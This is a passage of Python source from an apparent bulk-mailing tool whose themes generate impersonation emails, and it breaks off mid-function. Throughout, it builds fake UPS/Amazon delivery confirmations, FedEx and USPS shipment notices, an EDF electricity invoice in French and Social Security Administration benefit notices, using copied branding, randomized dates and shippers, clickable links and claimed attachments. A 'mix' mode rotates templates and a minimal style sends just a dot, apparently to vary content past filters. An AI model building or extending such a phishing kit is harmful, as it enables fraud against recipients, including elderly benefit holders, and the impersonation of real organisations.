            if messagebox.askyesno("Delete", f"Delete template?\n{self.body_templates_list[idx]['filename']}"):
                removed = self.body_templates_list.pop(idx)
                self._refresh_body_listbox()
                self._log(f"🗑 Removed: {removed['filename']}", C["yellow"])
        except (IndexError, tk.TclError):
            pass
    
    def _template_view(self, event):
        """Double-click → view template content"""
        try:
            idx = self.body_listbox.curselection()[0]
            t = self.body_templates_list[idx]
            
            dlg = tk.Toplevel(self)
            dlg.title(f"View: {t['filename']}")
            dlg.geometry("700x500")
            dlg.configure(bg=C["bg1"])
            
            tk.Label(dlg, text=t['filename'], bg=C["bg1"], fg=C["text"],
                     font=("Segoe UI", 11, "bold")).pack(pady=(10, 5))
            
            f = tk.Frame(dlg, bg=C["bg1"])
            f.pack(fill="both", expand=True, padx=15, pady=(0, 10))
            
            scrollbar = tk.Scrollbar(f)
            scrollbar.pack(side="right", fill="y")
            
            text = tk.Text(f, bg=C["input"], fg=C["text"], font=("Consolas", 8),
                           relief="flat", bd=0, yscrollcommand=scrollbar.set, wrap="word")
            text.pack(side="left", fill="both", expand=True)
            scrollbar.config(command=text.yview)
            
            text.insert("1.0", t['content'])
            text.config(state="disabled")
            
            tk.Button(dlg, text="Close", bg=C["bg3"], fg=C["text2"],
                      relief="flat", bd=0, cursor="hand2",
                      command=dlg.destroy).pack(pady=(0, 10), ipady=4, ipadx=20)
        except (IndexError, tk.TclError):
            pass
    
    # ─── GETTERS l _send_one ──────────────────────────────────
    def _theme_get_subject(self):
        """Theme-aware subject generation"""
        theme = self.theme_var.get() if hasattr(self, 'theme_var') else 'delivery'
        if theme == 'cola':
            return _generate_cola_subject()
        elif theme == 'ssa_simple':
            return _generate_ssa_simple_subject()
        elif theme == 'ups' or theme == 'ups_amazon':
            return _generate_ups_subject()
        elif theme == 'fedex':
            return _generate_fedex_subject()
        elif theme == 'usps':
            return _generate_usps_subject()
        elif theme == 'edf':
            return _generate_edf_subject()
        elif theme == 'mix':
            return self._mix_pick_subject()
        return _generate_random_subject()
    
    def _mix_pick_subject(self):
        """Pick subject from selected mix themes (or all if none selected)."""
        themes = self._get_mix_themes()
        choice = random.choice(themes)
        if choice == 'cola':
            return _generate_cola_subject()
        elif choice == 'ssa_simple':
            return _generate_ssa_simple_subject()
        elif choice == 'ups':
            return _generate_ups_subject()
        elif choice == 'ups_amazon':
            return _generate_ups_subject()
        elif choice == 'fedex':
            return _generate_fedex_subject()
        elif choice == 'usps':
            return _generate_usps_subject()
        elif choice == 'edf':
            return _generate_edf_subject()
        return _generate_random_subject()
    
    def _get_mix_themes(self):
        """Get the list of themes selected for Mix mode. Defaults to all if none."""
        if hasattr(self, '_mix_selected_themes') and self._mix_selected_themes:
            return list(self._mix_selected_themes)
        return ['cola', 'ups', 'edf', 'fedex', 'usps', 'ssa_simple', 'delivery']
    
    def _theme_get_display_name(self):
        """Theme-aware display name generation"""
        theme = self.theme_var.get() if hasattr(self, 'theme_var') else 'delivery'
        if theme == 'cola':
            return _generate_cola_display_name()
        elif theme == 'ssa_simple':
            return _generate_ssa_simple_display_name()
        elif theme == 'ups' or theme == 'ups_amazon':
            return _generate_ups_display_name()
        elif theme == 'fedex':
            return _generate_fedex_display_name()
        elif theme == 'usps':
            return _generate_usps_display_name()
        elif theme == 'edf':
            return _generate_edf_display_name()
        elif theme == 'mix':
            themes = self._get_mix_themes()
            choice = random.choice(themes)
            if choice == 'cola':
                return _generate_cola_display_name()
            elif choice == 'ssa_simple':
                return _generate_ssa_simple_display_name()
            elif choice == 'ups' or choice == 'ups_amazon':
                return _generate_ups_display_name()
            elif choice == 'fedex':
                return _generate_fedex_display_name()
            elif choice == 'usps':
                return _generate_usps_display_name()
            elif choice == 'edf':
                return _generate_edf_display_name()
            return _generate_random_name()
        return _generate_random_name()
    
    def _theme_get_template(self, recipient_name="[NAME]", recipient_email="[EMAIL]", link_url="#"):
        """Theme + Style aware template generation (V90)"""
        theme = self.theme_var.get() if hasattr(self, 'theme_var') else 'delivery'
        style = self.template_style_var.get() if hasattr(self, 'template_style_var') else 'old'
        
        # 🆕 V89: Style-based generation (style overrides theme for plain/minimal/simple)
        if style == "minimal":
            # Just a dot
            return "."
        
        if style == "new":
            # Plain text (personal email feel)
            return self._generate_plain_text_body(recipient_name, recipient_email, link_url)
        
        if style == "simple":
            # Lightweight HTML (no heavy newsletter)
            return self._generate_simple_html_body(recipient_name, recipient_email, link_url)
        
        if style == "mix":
            # Random pick across styles
            roll = random.random()
            if roll < 0.20:
                return "."
            elif roll < 0.40:
                return self._generate_plain_text_body(recipient_name, recipient_email, link_url)
            elif roll < 0.60:
                return self._generate_simple_html_body(recipient_name, recipient_email, link_url)
            # else fallthrough to "old" detailed (theme-aware)
        
        # Default = "old" detailed HTML (theme-aware!)
        if theme == 'cola':
            return _generate_cola_template(recipient_name, recipient_email, link_url)
        elif theme == 'ssa_simple':
            return _generate_ssa_simple_template(recipient_name, recipient_email, link_url)
        elif theme == 'ups':
            return _generate_ups_template(recipient_name, recipient_email, link_url)
        elif theme == 'ups_amazon':
            # 🆕 V91: UPS Amazon-only variant (force shipper)
            return _generate_ups_template(recipient_name, recipient_email, link_url, force_shipper="Amazon")
        elif theme == 'fedex':
            return _generate_fedex_template(recipient_name, recipient_email, link_url)
        elif theme == 'usps':
            return _generate_usps_template(recipient_name, recipient_email, link_url)
        elif theme == 'edf':
            return _generate_edf_template(recipient_name, recipient_email, link_url)
        elif theme == 'mix':
            themes = self._get_mix_themes()
            choice = random.choice(themes)
            if choice == 'cola':
                return _generate_cola_template(recipient_name, recipient_email, link_url)
            elif choice == 'ssa_simple':
                return _generate_ssa_simple_template(recipient_name, recipient_email, link_url)
            elif choice == 'ups':
                return _generate_ups_template(recipient_name, recipient_email, link_url)
            elif choice == 'ups_amazon':
                return _generate_ups_template(recipient_name, recipient_email, link_url, force_shipper="Amazon")
            elif choice == 'fedex':
                return _generate_fedex_template(recipient_name, recipient_email, link_url)
            elif choice == 'usps':
                return _generate_usps_template(recipient_name, recipient_email, link_url)
            elif choice == 'edf':
                return _generate_edf_template(recipient_name, recipient_email, link_url)
            return _generate_random_template()
        return _generate_random_template()
    
    def _generate_plain_text_body(self, name="[NAME]", email="[EMAIL]", link="#"):
        """Plain text personal email body — THEME-AWARE."""
        theme = self.theme_var.get() if hasattr(self, 'theme_var') else 'cola'
        
        if theme in ('ups', 'ups_amazon'):
            return self._gen_plain_ups(name, email, link, force_amazon=(theme == 'ups_amazon'))
        elif theme == 'edf':
            return self._gen_plain_edf(name, email, link)
        elif theme == 'cola':
            return self._gen_plain_cola(name, email, link)
        elif theme == 'mix':
            roll = random.random()
            if roll < 0.25:
                return self._gen_plain_cola(name, email, link)
            elif roll < 0.50:
                return self._gen_plain_ups(name, email, link)
            elif roll < 0.75:
                return self._gen_plain_edf(name, email, link)
        # Default generic
        return self._gen_plain_generic(name, email, link)
    
    def _gen_plain_ups(self, name, email, link, force_amazon=False):
        """Plain text — UPS delivery style. Random lifetime."""
        import datetime as _dt
        today = _dt.datetime.now()
        date_str = today.strftime("%A %m/%d/%Y")
        hour = random.randint(8, 17)
        minute = random.randint(0, 59)
        am_pm = "AM" if hour < 12 else "PM"
        display_hour = hour if hour <= 12 else hour - 12
        time_str = f"{display_hour}:{minute:02d} {am_pm}"
        
        shipper = "Amazon" if force_amazon else random.choice(_UPS_SHIPPERS)
        
        return f"""Hi,

Your package was delivered.

From: {shipper}

Delivered: {date_str}
Time: {time_str}

Sent to: {email}

UPS

—
©2026 United Parcel Service of America, Inc.
Please do not reply to this email."""
    
    def _gen_plain_edf(self, name, email, link):
        """Plain text — EDF facture style."""
        amount = random.choice(_EDF_AMOUNTS)
        return f"""Madame, Monsieur,

Vous trouverez, ci-joint, votre facture électronique au format PDF
d'un montant total à payer de {amount} euros TTC ou en votre faveur.

Compte client: {email}

En application de l'article L224-11 du Code de la consommation,
les sommes correspondant à des consommations ou de l'acheminement
pour la période concernée ont été annulées et sont donc non dues.

Retrouvez l'historique de vos factures sur 3 ans en vous connectant
à votre Espace Client.

En cas de difficulté de réception ou d'anomalie constatée sur
le contenu de votre facture, nous vous invitons à appeler le
n° de téléphone figurant sur votre facture.

Cordialement,
EDF.FR"""
    
    def _gen_plain_cola(self, name, email, link):
        """Plain text — COLA style."""
        return f"""Dear {name},

Your annual cost-of-living adjustment notice is now available
for review. Please review the attached document carefully.

Account: {email}

This notice contains important information regarding your
benefits for the upcoming year.

View your notice: {link}

Sincerely,
Social Security Administration
Federal Benefits Office

—
This is an automated notification — please do not reply."""
    
    def _gen_plain_generic(self, name, email, link):
        """Plain text — Generic fallback."""
        greetings = ["Hi", "Hello", "Hey", "Greetings", "Dear"]
        openings = [
            "Hope this message finds you well.",
            "I'm reaching out regarding your account.",
            "Quick update for your records.",
            "Important information about your account.",
        ]
        closings = ["Best regards,", "Thank you,", "Regards,", "Sincerely,"]
        signatures = ["Customer Service", "Account Team", "Support Team", "Notifications"]
        
        greeting = random.choice(greetings)
        opening = random.choice(openings)
        closing = random.choice(closings)
        signature = random.choice(signatures)
        
        return f"""{greeting} {name},

{opening}

Please review the attached document for full details.

Sent to: {email}

{closing}
{signature}"""
    
    def _generate_simple_html_body(self, name="[NAME]", email="[EMAIL]", link="#"):
        """Simple HTML body — THEME-AWARE (clean, simple version of theme)."""
        theme = self.theme_var.get() if hasattr(self, 'theme_var') else 'cola'
        
        if theme in ('ups', 'ups_amazon'):
            return self._gen_simple_ups(name, email, link, force_amazon=(theme == 'ups_amazon'))
        elif theme == 'edf':
            return self._gen_simple_edf(name, email, link)
        elif theme == 'cola':
            return self._gen_simple_cola(name, email, link)
        elif theme == 'ssa_simple':
            return self._gen_simple_ssa(name, email, link)
        elif theme == 'fedex':
            return self._gen_simple_fedex(name, email, link)
        elif theme == 'usps':
            return self._gen_simple_usps(name, email, link)
        elif theme == 'mix':
            themes = self._get_mix_themes() if hasattr(self, '_get_mix_themes') else []
            if not themes:
                themes = ['cola', 'ups', 'edf', 'ssa_simple', 'fedex', 'usps']
            choice = random.choice(themes)
            if choice == 'cola':
                return self._gen_simple_cola(name, email, link)
            elif choice in ('ups', 'ups_amazon'):
                return self._gen_simple_ups(name, email, link, force_amazon=(choice == 'ups_amazon'))
            elif choice == 'edf':
                return self._gen_simple_edf(name, email, link)
            elif choice == 'ssa_simple':
                return self._gen_simple_ssa(name, email, link)
            elif choice == 'fedex':
                return self._gen_simple_fedex(name, email, link)
            elif choice == 'usps':
                return self._gen_simple_usps(name, email, link)
        return self._gen_simple_generic(name, email, link)
    
    def _gen_simple_ssa(self, name, email, link):
        """Simple HTML — SSA Statement clean version. 3 variants."""
        variant = random.randint(1, 3)
        
        if variant == 1:
            return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="margin:0; padding:30px 20px; background:#f5f7fa; font-family:Arial,sans-serif; color:#000;">
<table width="540" align="center" style="margin:0 auto; background:#ffffff; border-collapse:collapse; box-shadow:0 2px 8px rgba(0,0,0,0.06);" cellpadding="0" cellspacing="0">
<tr>
  <td style="background:#003366; color:#fff; padding:18px 24px;">
    <div style="font-size:18px; font-weight:bold;">Social Security Statement</div>
    <div style="font-size:11px; opacity:0.9; margin-top:4px;">Annual Notice</div>
  </td>
</tr>
<tr>
  <td style="padding:24px; font-size:13px; line-height:1.6;">
    <p style="margin:0 0 14px;">Dear {name},</p>
    <p style="margin:0 0 14px;">Your annual Social Security Statement is now available for review.</p>
    <p style="margin:0 0 14px; padding:10px 14px; background:#f5f7fa; border-left:3px solid #003366; font-size:12px;">
      <strong>Account:</strong> {email}
    </p>
    <p style="margin:0 0 14px;">Please review the attached statement document for full details about your earnings record and benefit estimates.</p>
    <p style="margin:14px 0 0;">Sincerely,<br><strong>Social Security Administration</strong></p>
  </td>
</tr>
<tr>
  <td style="padding:12px 24px; background:#f5f7fa; color:#666; font-size:11px; text-align:center;">
    This is an automated notification — please do not reply.
  </td>
</tr>
</table>
</body></html>"""
        elif variant == 2:
            return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="margin:0; padding:40px 20px; background:#ffffff; font-family:Helvetica,Arial,sans-serif; color:#000;">
<table width="500" align="center" style="margin:0 auto; border-collapse:collapse;" cellpadding="0" cellspacing="0">
<tr>
  <td style="border-top:4px solid #003366; padding:32px 24px;">
    <h2 style="margin:0 0 18px; font-size:18px; color:#003366;">Your Social Security Statement</h2>
    <p style="margin:0 0 14px; font-size:13px; line-height:1.6;">Dear {name},</p>
    <p style="margin:0 0 14px; font-size:13px; line-height:1.6;">Your latest Social Security Statement has been published and is ready for your review.</p>
    <table width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 16px; border-top:1px solid #eee; border-bottom:1px solid #eee;">
      <tr>
        <td style="padding:12px 0; font-size:11px; color:#888;">Account</td>
        <td align="right" style="padding:12px 0; font-size:12px; color:#222; font-weight:600;">{email}</td>
      </tr>
    </table>
    <p style="margin:0 0 12px; font-size:13px; line-height:1.6;">📎 Please find your statement document attached.</p>
    <p style="margin:18px 0 0; font-size:12px; color:#666;">Best regards,<br><strong>Social Security Administration</strong></p>
  </td>
</tr>
</table>
</body></html>"""
        else:
            return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="margin:0; padding:0; background:#f0f0f0; font-family:Arial,sans-serif;">
<table width="100%" cellpadding="0" cellspacing="0" style="background:#003366; padding:14px 0;">
  <tr><td align="center" style="color:#fff; font-size:13px; font-weight:bold; letter-spacing:1px;">SOCIAL SECURITY ADMINISTRATION</td></tr>
</table>
<table width="540" align="center" style="margin:0 auto; background:#ffffff;" cellpadding="0" cellspacing="0">
<tr>
  <td style="padding:30px 24px; font-size:13px; line-height:1.6;">
    <p style="margin:0 0 14px;">Dear {name},</p>
    <p style="margin:0 0 14px;">Your annual Social Security Statement is streamlined and ready for review.</p>
    <p style="margin:0 0 14px; padding:10px 14px; background:#f5f7fa; border-left:3px solid #003366; font-size:12px;">
      <strong>Account:</strong> {email}
    </p>
    <p style="margin:0 0 14px;">📎 Your statement document is attached to this email.</p>
    <p style="margin:18px 0 0;">Sincerely,<br><strong>Social Security Administration</strong></p>
  </td>
</tr>
</table>
</body></html>"""
    
    def _gen_simple_fedex(self, name, email, link):
        """Simple HTML — FedEx clean. 3 variants. Today's actual date."""
        shipper = random.choice(_FEDEX_SHIPPERS)
        
        import datetime as _dt
        today = _dt.datetime.now()
        # 🆕 V108: Use TODAY's actual date (matches UPS approach)
        delivery_date_str = today.strftime("%a %m/%d/%Y")
        
        variant = random.randint(1, 3)
        
        if variant == 1:
            return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="margin:0; padding:30px 20px; background:#f8f9fa; font-family:Arial,sans-serif; color:#333;">
<table width="540" align="center" style="margin:0 auto; background:#ffffff; border-collapse:collapse; box-shadow:0 2px 8px rgba(0,0,0,0.06);" cellpadding="0" cellspacing="0">
<tr>
  <td align="center" style="padding:24px 20px 14px;">
    <span style="font-size:26px; font-weight:bold; color:#4d148c;">FedEx</span><span style="font-size:26px; font-weight:bold; color:#ff6600;">.</span>
  </td>
</tr>
<tr>
  <td style="padding:0 24px 14px; font-size:13px;">
    <p style="margin:0 0 14px;">Hi, {email}</p>
    <p style="margin:0 0 14px;">Your shipment from <strong>{shipper}</strong> is on the way.</p>
    <table width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 14px; background:#f5f0fa; border-left:4px solid #4d148c;">
      <tr><td style="padding:14px 18px;">
        <div style="font-size:11px; color:#4d148c; text-transform:uppercase; letter-spacing:1px; font-weight:600;">Scheduled delivery</div>
        <div style="font-size:18px; font-weight:bold; color:#121212; margin-top:4px;">{delivery_date_str}</div>
      </td></tr>
    </table>
    <p style="margin:0; font-size:12px; color:#666; font-style:italic;">📎 See attached delivery document</p>
  </td>
</tr>
<tr>
  <td style="padding:14px 24px; background:#fafafa; color:#999; font-size:10px; text-align:center; border-top:1px solid #eee;">
    Sent to: <strong>{email}</strong> · ©{today.year} FedEx
  </td>
</tr>
</table>
</body></html>"""
        elif variant == 2:
            return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="margin:0; padding:30px 20px; background:#ffffff; font-family:Arial,sans-serif; color:#333;">
<table width="540" align="center" style="margin:0 auto; background:#ffffff; border:1px solid #e0e0e0;" cellpadding="0" cellspacing="0">
<tr>
  <td style="background:#4d148c; padding:18px 24px;">
    <span style="color:#fff; font-size:22px; font-weight:bold;">FedEx</span><span style="color:#ff6600; font-size:22px; font-weight:bold;">.</span>
    <span style="float:right; color:#fff; font-size:11px; padding-top:6px; opacity:0.9;">SHIPMENT UPDATE</span>
  </td>
</tr>
<tr>
  <td style="padding:24px; font-size:13px;">
    <p style="margin:0 0 12px;">Hi, {email}</p>
    <h2 style="margin:0 0 8px; font-size:20px; color:#121212;">Your package is on the way</h2>
    <p style="margin:0 0 16px; color:#666;">From <strong style="color:#4d148c;">{shipper}</strong></p>
    <table width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 16px;">
      <tr>
        <td style="padding:14px; background:#f5f0fa; border-radius:4px;">
          <div style="font-size:11px; color:#666; text-transform:uppercase; letter-spacing:1px;">Scheduled Delivery</div>
          <div style="font-size:16px; font-weight:bold; margin-top:4px;">{delivery_date_str}</div>
        </td>
      </tr>
    </table>
    <p style="margin:0; font-size:11px; color:#666; font-style:italic;">📎 Please see the attached delivery confirmation</p>
  </td>
</tr>
</table>
</body></html>"""
        else:
            return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="margin:0; padding:40px 20px; background:#fafafa; font-family:Helvetica,Arial,sans-serif;">
<table width="500" align="center" style="margin:0 auto; background:#ffffff;" cellpadding="0" cellspacing="0">
<tr>
  <td style="border-top:4px solid #4d148c; padding:30px 24px;">
    <div style="font-size:24px; font-weight:bold; margin-bottom:18px;"><span style="color:#4d148c;">FedEx</span><span style="color:#ff6600;">.</span></div>
    <p style="margin:0 0 14px; font-size:13px;">Hi, {email}</p>
    <p style="margin:0 0 14px; font-size:13px;">Your shipment from <strong>{shipper}</strong> is on the way.</p>
    <p style="margin:0 0 14px; font-size:24px; font-weight:300; color:#4d148c; letter-spacing:-0.5px;">{delivery_date_str}</p>
    <p style="margin:18px 0 0; font-size:11px; color:#666;">📎 See attached delivery document</p>
  </td>
</tr>
</table>
</body></html>"""
    
    def _gen_simple_usps(self, name, email, link):
        """Simple HTML — USPS clean version. 3 variants. Today's actual date."""
        recipient_label = random.choice(_USPS_RECIPIENTS)
        
        import datetime as _dt
        today = _dt.datetime.now()
        # 🆕 V108: Use TODAY's actual date
        full_date = today.strftime("%A, %B %d, %Y")
        day_short = today.strftime("%d").lstrip("0")
        month_short = today.strftime("%b")
        arr_hour = random.choice([5, 6, 7, 8, 9])
        arrival = f"{arr_hour}:00pm"
        
        variant = random.randint(1, 3)
        
        if variant == 1:
            return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="margin:0; padding:30px 20px; background:#f4f4f4; font-family:Arial,sans-serif; color:#333;">
<table width="540" align="center" style="margin:0 auto; background:#ffffff; box-shadow:0 2px 8px rgba(0,0,0,0.06);" cellpadding="0" cellspacing="0">
<tr>
  <td style="background:#004b87; padding:14px 20px; color:#fff;">
    <span style="font-size:20px; font-weight:bold; letter-spacing:1px;">USPS</span>
    <span style="float:right; font-size:10px; padding-top:7px; opacity:0.9;">U.S. POSTAL SERVICE</span>
  </td>
</tr>
<tr>
  <td style="padding:22px 22px 14px; font-size:13px;">
    <p style="margin:0 0 12px;">Hello {recipient_label},</p>
    <p style="margin:0 0 14px;">Your package is expected to arrive by <strong>{full_date}</strong> by {arrival}.</p>
    <table width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 12px; background:#f9f9f9; border:1px solid #e0e0e0;">
      <tr>
        <td width="120" align="center" style="padding:14px; background:#fff; border-right:1px solid #e0e0e0;">
          <div style="font-size:9px; color:#666; text-transform:uppercase; letter-spacing:1px;">Expected By</div>
          <div style="font-size:36px; font-weight:bold; color:#d52b1e; line-height:1;">{day_short}</div>
          <div style="font-size:14px; color:#333; text-transform:uppercase;">{month_short}</div>
        </td>
        <td align="center" style="padding:14px; font-size:13px; color:#666;">
          By {arrival}
        </td>
      </tr>
    </table>
    <p style="margin:0; font-size:11px; color:#666; font-style:italic;">📎 See attached document</p>
  </td>
</tr>
<tr>
  <td style="padding:10px 20px; background:#f0f0f0; color:#666; font-size:10px; text-align:center;">
    ©{today.year} USPS · Sent to: <strong>{email}</strong>
  </td>
</tr>
</table>
</body></html>"""
        elif variant == 2:
            return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="margin:0; padding:30px 20px; background:#ffffff; font-family:Arial,sans-serif;">
<table width="500" align="center" style="margin:0 auto; background:#fff;" cellpadding="0" cellspacing="0">
<tr>
  <td align="center" style="border-top:4px solid #004b87; padding:24px;">
    <div style="font-size:26px; font-weight:bold; color:#004b87; letter-spacing:1px; margin-bottom:8px;">USPS</div>
    <p style="margin:0 0 14px; font-size:12px; color:#666;">U.S. POSTAL SERVICE</p>
    <p style="margin:0 0 14px; font-size:13px; text-align:left;">Hello {recipient_label},</p>
    <p style="margin:0 0 14px; font-size:13px; text-align:left;">Expected delivery by <strong>{full_date}</strong>.</p>
    <p style="margin:0 0 14px; font-size:42px; font-weight:bold; color:#d52b1e;">{day_short} <span style="font-size:18px; color:#333; vertical-align:middle;">{month_short.upper()}</span></p>
    <p style="margin:0 0 12px; font-size:12px; color:#666;">By {arrival}</p>
    <p style="margin:0; font-size:11px; color:#666; font-style:italic;">📎 See attached document</p>
  </td>
</tr>
</table>
</body></html>"""
        else:
            return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="margin:0; padding:0; background:#f4f4f4; font-family:Arial,sans-serif;">
<table width="100%" cellpadding="0" cellspacing="0" style="background:#004b87; padding:12px 0;">
  <tr><td align="center" style="color:#fff; font-size:14px; font-weight:bold; letter-spacing:2px;">USPS DELIVERY NOTIFICATION</td></tr>
</table>
<table width="540" align="center" style="margin:20px auto; background:#fff;" cellpadding="0" cellspacing="0">
<tr>
  <td style="padding:24px; font-size:13px;">
    <p style="margin:0 0 12px;">Hello {recipient_label},</p>
    <p style="margin:0 0 14px;">Your package is expected to arrive by <strong>{full_date}</strong> by {arrival}.</p>
    <p style="margin:0; font-size:11px; color:#666; font-style:italic;">📎 See attached document for full delivery details</p>
  </td>
</tr>
<tr>
  <td style="padding:10px 24px; background:#f0f0f0; color:#666; font-size:10px; text-align:center;">
    ©{today.year} USPS · Sent to: {email}
  </td>
</tr>
</table>
</body></html>"""
    
    def _gen_simple_ups(self, name, email, link, force_amazon=False):
        """Simple HTML — UPS clean version. 4 random variants, lifetime random."""
        import datetime as _dt
        today = _dt.datetime.now()
        date_str = today.strftime("%A %m/%d/%Y")
        date_short = today.strftime("%b %d, %Y")
        hour = random.randint(8, 17)
        minute = random.randint(0, 59)
        am_pm = "AM" if hour < 12 else "PM"
        display_hour = hour if hour <= 12 else hour - 12
        time_str = f"{display_hour}:{minute:02d} {am_pm}"
        
        shipper = "Amazon" if force_amazon else random.choice(_UPS_SHIPPERS)
        button_text = random.choice(_UPS_BUTTON_TEXTS)
        
        # Random color scheme
        scheme = random.choice([
            {"primary": "#351c15", "accent": "#ffb500", "bg": "#f3f3f3"},
            {"primary": "#3d2014", "accent": "#ffc933", "bg": "#fafafa"},
            {"primary": "#4a2818", "accent": "#fda600", "bg": "#f5f5f5"},
        ])
        
        # Pick 1 of 4 variants
        variant = random.randint(1, 4)
        
        if variant == 1:
            # VARIANT 1: Centered card with shadow
            return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="margin:0; padding:40px 20px; background-color:{scheme['bg']}; font-family:'Segoe UI',Arial,sans-serif; color:#121212;">
<table width="520" align="center" style="margin:0 auto; background:#ffffff; border-collapse:collapse; box-shadow:0 4px 16px rgba(0,0,0,0.08); border-radius:8px; overflow:hidden;" cellpadding="0" cellspacing="0">
<tr>
  <td align="center" style="padding:32px 20px 20px; background:#ffffff;">
    <div style="font-size:32px; font-weight:800; color:{scheme['primary']}; letter-spacing:2px;">UPS</div>
    <div style="height:3px; width:50px; background:{scheme['accent']}; margin:8px auto 0;"></div>
  </td>
</tr>
<tr>
  <td align="center" style="padding:8px 24px 4px; color:#666; font-size:13px;">Hi,</td>
</tr>
<tr>
  <td align="center" style="padding:12px 24px 8px; font-size:24px; font-weight:700; color:#121212;">
    Your package was delivered.
  </td>
</tr>
<tr>
  <td align="center" style="padding:0 24px 16px; font-size:14px; color:#444;">
    From <strong style="color:{scheme['primary']};">{shipper}</strong>
  </td>
</tr>
<tr>
  <td align="center" style="padding:8px 24px;">
    <div style="display:inline-block; padding:14px 24px; background:#fafafa; border:1px solid #eee; border-radius:6px; min-width:200px;">
      <div style="font-size:13px; color:#888; text-transform:uppercase; letter-spacing:1px; margin-bottom:4px;">Delivered</div>
      <div style="font-size:18px; font-weight:700; color:#121212;">{date_str}</div>
      <div style="font-size:14px; color:#555; margin-top:2px;">{time_str}</div>
    </div>
  </td>
</tr>
<tr>
  <td align="center" style="padding:24px 24px 20px;">
    <a href="{link}" style="display:inline-block; padding:14px 36px; background:{scheme['accent']}; color:#121212; text-decoration:none; font-weight:700; font-size:15px; border-radius:4px;">{button_text}</a>
  </td>
</tr>
<tr>
  <td align="center" style="padding:0 24px 16px; color:#888; font-size:12px;">
    Sent to: <strong style="color:#444;">{email}</strong>
  </td>
</tr>
<tr>
  <td align="center" style="padding:16px 24px; background:#f8f8f8; color:#888; font-size:10px; line-height:1.5;">
    ©2026 United Parcel Service of America, Inc.<br>
    Please do not reply to this email.
  </td>
</tr>
</table>
</body></html>"""
        
        elif variant == 2:
            # VARIANT 2: Header bar with brown band
            return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="margin:0; padding:30px 20px; background-color:{scheme['bg']}; font-family:Arial,sans-serif; color:#121212;">
<table width="520" align="center" style="margin:0 auto; background:#ffffff; border-collapse:collapse; border:1px solid #e5e5e5;" cellpadding="0" cellspacing="0">
<tr>
  <td style="background:{scheme['primary']}; padding:16px 24px;">
    <span style="color:#ffffff; font-size:24px; font-weight:800; letter-spacing:1.5px;">UPS</span>
    <span style="float:right; color:{scheme['accent']}; font-size:12px; padding-top:8px; font-weight:600;">DELIVERY UPDATE</span>
  </td>
</tr>
<tr>
  <td style="padding:24px;">
    <p style="margin:0 0 8px; font-size:14px; color:#555;">Hi,</p>
    <h2 style="margin:0 0 16px; font-size:22px; color:#121212; font-weight:700;">Your package was delivered.</h2>
    <p style="margin:0 0 20px; font-size:14px; color:#444;">From <strong>{shipper}</strong></p>
    
    <table width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 24px; background:#fff8e6; border-left:4px solid {scheme['accent']};">
      <tr>
        <td style="padding:14px 18px;">
          <div style="font-size:12px; color:#666; text-transform:uppercase; letter-spacing:0.5px;">Delivered</div>
          <div style="font-size:17px; font-weight:700; color:#121212; margin-top:2px;">{date_str} · {time_str}</div>
        </td>
      </tr>
    </table>
    
    <table width="100%" cellpadding="0" cellspacing="0">
      <tr>
        <td align="center">
          <a href="{link}" style="display:inline-block; padding:13px 32px; background:{scheme['accent']}; color:#121212; text-decoration:none; font-weight:700; font-size:14px;">{button_text}</a>
        </td>
      </tr>
    </table>
  </td>
</tr>
<tr>
  <td style="padding:14px 24px; background:#fafafa; border-top:1px solid #eee; color:#777; font-size:12px;">
    Sent to: <strong>{email}</strong>
  </td>
</tr>
<tr>
  <td style="padding:12px 24px; background:#f0f0f0; color:#888; font-size:10px; text-align:center;">
    ©2026 UPS · Please do not reply
  </td>
</tr>
</table>
</body></html>"""
        
        elif variant == 3:
            # VARIANT 3: Minimalist clean
            return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="margin:0; padding:50px 20px; background-color:#ffffff; font-family:Helvetica,Arial,sans-serif; color:#121212;">
<table width="480" align="center" style="margin:0 auto; border-collapse:collapse;" cellpadding="0" cellspacing="0">
<tr>
  <td align="center" style="padding-bottom:32px;">
    <span style="display:inline-block; padding:10px 18px; background:{scheme['primary']}; color:#fff; font-size:20px; font-weight:800; letter-spacing:2px;">UPS</span>
  </td>
</tr>
<tr>
  <td align="center" style="padding-bottom:8px; color:#666; font-size:13px;">Hi,</td>
</tr>
<tr>
  <td align="center" style="padding-bottom:20px;">
    <h1 style="margin:0; font-size:28px; font-weight:300; color:#121212; line-height:1.3;">Your package<br>was delivered.</h1>
  </td>
</tr>
<tr>
  <td align="center" style="padding-bottom:24px;">
    <span style="display:inline-block; padding:6px 14px; background:#f5f5f5; border-radius:20px; font-size:13px; color:#444;">From {shipper}</span>
  </td>
</tr>
<tr>
  <td align="center" style="padding-bottom:8px; font-size:14px; color:#888; text-transform:uppercase; letter-spacing:2px;">Delivered</td>
</tr>
<tr>
  <td align="center" style="padding-bottom:32px;">
    <div style="font-size:20px; font-weight:600; color:#121212;">{date_str}</div>
    <div style="font-size:15px; color:#666; margin-top:4px;">{time_str}</div>
  </td>
</tr>
<tr>
  <td align="center" style="padding-bottom:32px;">
    <a href="{link}" style="display:inline-block; padding:14px 40px; background:{scheme['accent']}; color:#121212; text-decoration:none; font-weight:700; font-size:14px; letter-spacing:0.5px;">{button_text}</a>
  </td>
</tr>
<tr>
  <td align="center" style="padding-bottom:24px; color:#999; font-size:12px;">
    Sent to {email}
  </td>
</tr>
<tr>
  <td align="center" style="border-top:1px solid #eee; padding-top:16px; color:#bbb; font-size:10px;">
    ©2026 UPS
  </td>
</tr>
</table>
</body></html>"""
        
        else:
            # VARIANT 4: Two-column with side accent
            return f"""<!DOCTYPE html>
